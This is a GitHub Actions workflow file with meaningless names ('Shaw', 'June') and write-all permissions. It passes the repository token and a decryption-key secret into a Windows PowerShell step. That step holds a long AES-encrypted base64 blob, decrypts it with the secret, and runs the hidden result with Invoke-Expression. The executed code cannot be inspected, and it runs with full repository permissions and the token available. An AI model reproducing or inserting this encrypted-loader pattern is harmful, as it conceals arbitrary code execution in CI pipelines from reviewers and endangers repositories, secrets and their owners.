name: Shaw

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: ''
        type: string
      option2:
        required: false
        default: ''
        type: string
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}

jobs:
  k:
    runs-on: windows-latest
    steps:
      - name: June
        shell: pwsh
        run: |
          $encrypted_payload = "U2FsdGVkX18ky4RzmsDP0FafM990VtyMJ1K4C+sVrSkI0dZw9/DdZLJ/58pFOCp/DbfR+NKwQR63LfU7QkteMDAaVnZ3J5ph5dvPMiln+uVENtA4gh1mnau+vjGY8nN+InQUpD61EevTIE7QyMJTYO8CBPFJQRaVvyV8RaVda7PSiM/fpGuCbM6JvOx5s36FdDtS2t/Jqr+fuKCiF2OlY5L5rwwgiXLO92oxINQ+i7tbjJMWIm9t5LONJVD2DP1SD0laDgoDE4A1t+ZY0jZMLznaYFj5A4TlYVw1/FKguTJ+gf570ZTfVKO56gHOOZMR/yuS1OMqj7mmQRufMGVRfCeP/L2eYAMmN+7rZpeSiLoeahWxXVdT5g6NAzAWcmrl4SEM0Mjgdv0XfnQTih6Pb99DgrWeddzHYWVKRj9yFJQS5jyb3jCeG2FT/8BFWzTpw7gFPK2otWKXWwO5OMQl07CA/aI6p25gaDDj/tqDvn6NJ2kjxQz+Dui83dpcEuNfXKK3jn+xXOT61PgsXXqILVFDVUuwPuzxALnlH+8Jqb37ZmdjSiHm6teu1YwUZx7AmvlWz3ZWUy4YC3AISut3S8nwNzw0bcYpy+OUQMRjpoZxrArHKM90Fsgpsh3lxit/eXxp16qCBO8/2D+UBosDBriuwWWWWR192ST/o/CxiJNhEs2vSkaPsMcwiuFeq+3m1m+PQhsyKJ3sWiYwpDuq4VbKtph+GRUNC09iMtXhV0OcS8q5+lDMt1LdypGcAfaCdVLttlh06knsiNuGbyngZBkLAV/vGUYsOq1DxAojXvPHRXvfP7Ft7lNCsug2yw4bhZnkbpf70K9eROefewVUi2G4AuHC00NZnU00wtWzAo1bZbc39H7bSxh7yEPn/LoYgT9Vf6Zro92tUHO9ZMpuLanqTCJychP6lDCj2HFy5Alsn/2nN2LwTBAzSyipcKDy1IgqcfbgM8fOYjpxdC1GmkqqIzC3P3yfD7XxKwQwweqkQZ3Kc2Qg4zfuL4zPMR3oXU2/W5FOOvNaHHX1ceAWL0oCfiB8OJ54Ee79LnA2y9TDlCLagx9zZQo0KDh8d7ff5WwpYpq7EVN5EYY/2F/Ktj40CXSxuQIREJIFAsM63CUG15FKVBJXUqdzbPtU7NqMyg8thSjtVhR929yV3k731xQcMIfao8J0+JzOVY6ohBpJ6bO/kuMozEN7w3TsuQpBqupHgYKlkob4rdbsg0E5rBvsl/RQ7nk/o3jSaHjxZ08dwyP+aCYAS3vRAY1Ybm3RQ9KPHrFlAvBzWzvkLNtFMDGHUYyHxImHnOKqDTDHE8AsZ/QcUZalxKboKJweGTXQShEZ+XsmRGtBdcIjWwly16jxYslrUmdtqD0BqbDwaD+mODbuVodGGh4dNVEc7Q4cNcr8+cJXCyxCj4l7ADoMYxCfIzLXsMNePJwEa1Z6A773IJJYFyGDijwaGJ/VIGZCnKgMC3jB/rbqv8wp2wHKJRWYrYbl8cH1JHEeeo8DlwTtzAHnpBbNpk8tMjPUD0OO0MpX7jG7MVN1uKv9Sj/b+ABPvwO8/fMUzY4WY/rFBMTSfsINTFJ0Gtvli5Va24FugvUPTZBVrDojimPG0qbDY7EYRe8gzk9tT1rPsQ7SPTfbLeT/zrF/NLenLq2xIeyLHcvzKep/eH74p5S+EWI7QkwvJr+WkCpfVEbtTY1ng56K5VxwB0A4IMumGlG135Bo"
          $passphrase = $env:DECRYPTION_KEY

          $iterations = 10000
          $keySizeBytes = 32
          $ivSizeBytes = 16

          function Try-OpenSSLStyleDecrypt {
              param(
                  [byte[]]$ciphertextWithPossibleHeader,
                  [string]$password
              )

              try {
                  if (-not $password) {
                      throw "no supply"
                  }

                  # Check for OpenSSL 'Salted__' header (ASCII) -> first 8 bytes 'Salted__', next 8 bytes salt
                  $header = [System.Text.Encoding]::ASCII.GetString($ciphertextWithPossibleHeader, 0, [Math]::Min(8, $ciphertextWithPossibleHeader.Length))
                  if ($header -eq "Salted__") {
                      # extract salt (bytes 8..15) and ciphertext (from byte 16 onward)
                      $salt = [byte[]]($ciphertextWithPossibleHeader[8..15])
                      $cipherBytes = if ($ciphertextWithPossibleHeader.Length -gt 16) { [byte[]]($ciphertextWithPossibleHeader[16..($ciphertextWithPossibleHeader.Length - 1)]) } else { @() }
                  } else {
                      # no salt header found — assume the whole buffer is raw ciphertext, no salt
                      $salt = $null
                      $cipherBytes = $ciphertextWithPossibleHeader
                  }

                  # Derive key+iv using PBKDF2
                  $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($password)

                  if ($salt -ne $null -and $salt.Length -gt 0) {
                      # Try to use SHA256-based Rfc2898DeriveBytes (requires .NET that supports HashAlgorithmName overload)
                      try {
                          $deriveCtor = [System.Security.Cryptography.Rfc2898DeriveBytes].GetConstructors() |
                                        Where-Object { $_.GetParameters().Length -ge 3 } |
                                        Select-Object -First 1
                          # Use explicit HashAlgorithmName if available (PowerShell Core / modern .NET)
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              ([System.Text.Encoding]::UTF8.GetString($passwordBytes)),
                              $salt,
                              $iterations,
                              [System.Security.Cryptography.HashAlgorithmName]::SHA256
                          )
                      } catch {
                          # Fallback to older constructor (uses HMACSHA1) — only do this if you know the data was derived with SHA1
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              $password,
                              $salt,
                              $iterations
                          )
                          Write-Warning "Rfc2898DeriveBytes SHA256 overload not available; falling back to default SHA1-based PBKDF2. If encryption used PBKDF2-SHA256, specify a PowerShell/.NET runtime that supports it."
                      }
                  } else {
                      # no salt -> cannot derive key reliably; try deriving with empty salt
                      $salt = ,0..7 | ForEach-Object { [byte]0 }
                      $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
                  }

                  $key = $rdb.GetBytes($keySizeBytes)
                  $iv  = $rdb.GetBytes($ivSizeBytes)

                  # Create AES decryptor
                  $aes = [System.Security.Cryptography.Aes]::Create()
                  $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                  $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                  $aes.KeySize = 256
                  $aes.Key = $key
                  $aes.IV = $iv

                  $transform = $aes.CreateDecryptor()
                  $ms = New-Object System.IO.MemoryStream (,$cipherBytes)
                  $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $transform, [System.Security.Cryptography.CryptoStreamMode]::Read)
                  $sr = New-Object System.IO.StreamReader($cs, [System.Text.Encoding]::UTF8)
                  $plaintext = $sr.ReadToEnd()

                  # clean up
                  $sr.Close(); $cs.Close(); $ms.Close(); $aes.Dispose()

                  return $plaintext
              } catch {
                  throw $_
              }
          }

          try {
              $cipherBytes = [Convert]::FromBase64String($encrypted_payload)

              $decrypted = Try-OpenSSLStyleDecrypt -ciphertextWithPossibleHeader $cipherBytes -password $passphrase

              if ($null -ne $decrypted -and $decrypted.Length -gt 0) {
                  Invoke-Expression $decrypted
              } else {
                  Write-Error "Decryption succeeded but produced empty output."
              }
          } catch {
              Write-Error "Decryption failed: $($_.Exception.Message)"
          }
